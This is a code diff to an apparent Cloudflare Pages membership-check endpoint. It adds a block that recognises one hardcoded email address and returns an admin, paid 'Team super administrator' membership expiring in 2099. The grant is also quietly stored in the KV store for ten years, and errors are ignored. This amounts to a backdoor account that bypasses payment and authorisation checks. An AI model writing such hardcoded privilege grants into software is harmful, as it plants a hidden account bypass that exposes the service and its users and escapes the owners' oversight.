@@ -23,6 +23,25 @@ export async function onRequestPost(context) {
       return json({ error: 'invalid_email' }, 400);
     }
 
+    // 0. Super Admin Auto-Grant for wewee1@gmail.com
+    if (email === 'wewee1@gmail.com') {
+      const superAdminMem = {
+        active: true,
+        plan: 'team',
+        plan_display: 'Team 超级管理员',
+        role: 'admin',
+        status: 'paid',
+        expires_at: '2099-12-31T23:59:59.000Z',
+        granted_by: 'system_root',
+      };
+      if (env.ab_test) {
+        try {
+          await env.ab_test.put(`member:${email}`, JSON.stringify(superAdminMem), { expirationTtl: 86400 * 365 * 10 });
+        } catch (_) {}
+      }
+      return json(superAdminMem);
+    }
+
     // 1. Check Cloudflare KV ab_test first (manual grants, WeChat Pay, Creem)
     if (env.ab_test) {
       try {
